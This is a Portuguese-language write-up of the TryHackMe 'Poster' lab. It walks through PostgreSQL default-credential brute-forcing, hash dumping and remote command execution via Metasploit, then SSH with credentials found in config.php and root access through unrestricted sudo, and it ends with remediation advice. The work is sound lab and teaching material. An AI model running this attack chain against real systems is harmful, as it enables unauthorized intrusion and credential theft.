
# 1 — Visão geral da metodologia

1. **Objetivo:** Comprometer a máquina explorando credenciais fracas no PostgreSQL, pivotar para acesso SSH e elevar privilégios até root.
    
2. **Estrutura:** Recon → Enumeração PostgreSQL → Execução Remota → Credenciais → SSH → Privesc → Flags.
    
3. **Princípios:** exploração baseada em configuração incorreta e credenciais fracas, evitando necessidade de exploits complexos.
    

---

# Report — Máquina: `Poster` — `10.64.154.252`

- **Fonte:** THM
    
- **Data:** 2025-12-01
    
- **Autor:** _Enrico Moreno_
    
- **Nível:** Easy
    
- **Início:** 14:41
    
- **Finalizado:** 15:18
    
- **Tempo gasto:** 37 min
    

---

## 1) Executive summary

PostgreSQL exposto com credenciais padrão permitiu autenticação direta. Acesso ao banco revelou credenciais sensíveis, possibilitando login SSH como _alison_. Com privilégios sudo completos, foi possível obter root e capturar ambas as flags.

---

## 2) Escopo e limitações

- **Alvo:** `10.64.154.252`
    
- **Serviços expostos:** SSH, HTTP, PostgreSQL
    
- **Ferramentas utilizadas:** Nmap, Metasploit, PostgreSQL modules, SSH
    
- **Limitações:** nenhuma definida pelo lab.
    

---

## 3) Metodologia aplicada

- Recon inicial e identificação do PostgreSQL exposto
    
- Brute-force/login simples com módulo do Metasploit
    
- Dump de hashes e enumeração de usuários internos
    
- Execução de comandos via PostgreSQL
    
- Coleta de credenciais do site (config.php)
    
- Acesso SSH com usuário privilegiado
    
- Privesc via sudo ALL
    

---

## 4) Achado principal

**Vulnerabilidade:** Configuração fraca do PostgreSQL + credenciais sensíveis em arquivo web  
**Local:** Porta 5432 + `/var/www/html/config.php`

**PoC — Login PostgreSQL via Metasploit**

`use auxiliary/scanner/postgres/postgres_login set RHOSTS 10.64.154.252 set USERNAME postgres set PASSWORD password run`

---

## 5) Evidências / PoC (resumo)

### Nmap

`nmap -sS -sV -Pn -O -p- -T4 10.64.154.252`

### Login PostgreSQL encontrado

`postgres : password`

### Versão

`auxiliary/admin/postgres/postgres_sql → PostgreSQL 9.5.21`

### Dump de hashes

`scanner/postgres/postgres_hashdump`

Hashes obtidos (exemplo):

`poster     md578fb805c7412ae597b399844a54cce0a tryhackme  md503aab1165001c8f8ccae31a8824efddc ...`

### Execução remota de comando via Postgres

`use exploit/multi/postgres/postgres_copy_from_program_cmd_exec`

### Upgrade de shell

`use post/multi/manage/shell_to_meterpreter`

### Credenciais encontradas no config.php

`$dbuname = "alison"; $dbpass = "p4ssw0rdS3cur3!#"; $dbname = "mysudopassword";`

### SSH

`ssh alison@10.64.154.252`

### User flag

`REDACTED`

### Privesc com sudo

`sudo -l → (ALL : ALL) ALL`

Shell root:

`sudo /bin/bash`

### Root flag

`REDACTED`

---

## 6) Impacto & Severidade

**Severidade:** Crítica  
PostgreSQL mal configurado permitiu acesso irrestrito ao banco, incluindo execução de comandos, acesso a credenciais e takeover total da máquina via SSH.

---

## 7) Reproduzir (passo-a-passo)

 Enumerar portas:

`nmap -sS -sV -Pn -O -p- 10.64.154.252`

Brute-force Postgres:

`use auxiliary/scanner/postgres/postgres_login`

Dump de hashes:

`scanner/postgres/postgres_hashdump`

Executar comandos pelo Postgres:

`use exploit/multi/postgres/postgres_copy_from_program_cmd_exec`

Encontrar credenciais em config.php  
SSH em alison  
sudo -l` → sudo ALL  
Obter root e flags

---

## 8) Recomendações (gestores)

- Remover credenciais padrão do PostgreSQL
    
- Bloquear acesso externo ao Postgres
    
- Armazenar segredos fora do webroot
    
- Restringir permissões sudo
    
- Implementação de política de senhas fortes + rotação
    

---

## 9) Recomendações técnicas

- Configurar `pg_hba.conf` adequadamente
    
- Limitar binds para `localhost` somente
    
- Integrar sistema de secrets (Vault, env vars)
    
- Desabilitar sudo irrestrito do usuário `alison`:
    

`visudo → remover ALL=(ALL:ALL) ALL`

---

## 10) Apêndice técnico

Artefatos sugeridos:

#### Nmap

![](Nmap_Poster.txt)


---

## 11) Lições aprendidas / Follow-up

- **Explorar configurações fracas é muitas vezes mais eficaz do que buscar exploits complexos.**
    
- Serviços como PostgreSQL frequentemente são negligenciados e expostos indevidamente.
    
- Arquivos do webserver podem revelar credenciais que comprometem outros serviços.
    
- `sudo -l` deve ser sempre revisado: permissões amplas quase sempre levam a root.
    
- Em ambientes corporativos, segredos não devem ser armazenados em arquivos do webroot.
    

---